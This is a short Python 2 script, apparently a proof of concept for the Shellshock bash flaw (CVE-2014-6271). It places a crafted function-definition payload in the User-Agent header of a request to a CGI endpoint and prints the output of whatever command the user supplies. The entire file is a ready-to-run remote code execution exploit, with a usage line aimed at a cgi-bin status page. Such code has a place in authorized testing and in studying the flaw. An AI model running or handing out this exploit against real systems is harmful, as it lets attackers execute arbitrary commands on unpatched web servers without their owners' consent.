#!/usr/bin/python
# -*- coding: utf-8 -*-

import urllib2
import httplib


def exploit(url, cmd):
    payload = "() { test;};echo \"Content-type: text/plain\"; echo; echo; '%s'" % cmd
    print '[*] Final payload: ' + payload
    try:
        headers = {'User-Agent': payload}
        request = urllib2.Request(url, headers=headers)
        page = urllib2.urlopen(request).read()
    except httplib.IncompleteRead, e:
        page = e.partial

    print(page)
    return page


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 3:
        print("[*] shellshockpoc.py <url> <cmd>")
        print("[*] Usage example: http://vulnerablehost.com/cgi-bin/status /usr/bin/id")
    else:
        print('[*] GNU Bash Remote Code Execution Vulnerability (CVE-2014-6271)')
        url = sys.argv[1]
        cmd = sys.argv[2]
        print("[*] cmd provided: %s\n" % cmd)
        exploit(url, cmd)
